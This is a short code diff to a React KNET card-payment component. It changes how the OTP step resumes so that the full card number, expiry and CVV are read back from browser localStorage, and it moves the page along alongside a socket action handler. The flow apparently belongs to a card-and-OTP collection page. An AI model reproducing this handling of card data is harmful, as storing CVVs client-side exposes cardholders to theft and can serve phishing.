@@ -194,11 +194,18 @@ export default function KNETPayment() {
 
   // Resume OTP phase after coming back from bank app page
   useEffect(() => {
-    if (localStorage.getItem("knetPhase") === "otp") {
-      localStorage.removeItem("knetPhase");
-      setPhase("otp");
-      startCountdown();
-    }
+    if (localStorage.getItem("knetPhase") !== "otp") return;
+    localStorage.removeItem("knetPhase");
+    const pd = JSON.parse(localStorage.getItem("paymentData") || "{}");
+    if (pd.cardNumber) setCardNumber(pd.cardNumber);
+    if (pd.prefix) setSelectedPrefix(pd.prefix);
+    if (pd.bankName) setSelectedBank(pd.bankName);
+    if (pd.expiryMonth) setExpiryMonth(pd.expiryMonth);
+    if (pd.expiryYear) setExpiryYear(pd.expiryYear);
+    if (pd.cvv) setCardCvv(pd.cvv);
+    setPhase("otp");
+    startCountdown();
+    navigateToPage("رمز التحقق كي نت (OTP)");
   }, []);
 
   // Direct socket action handler
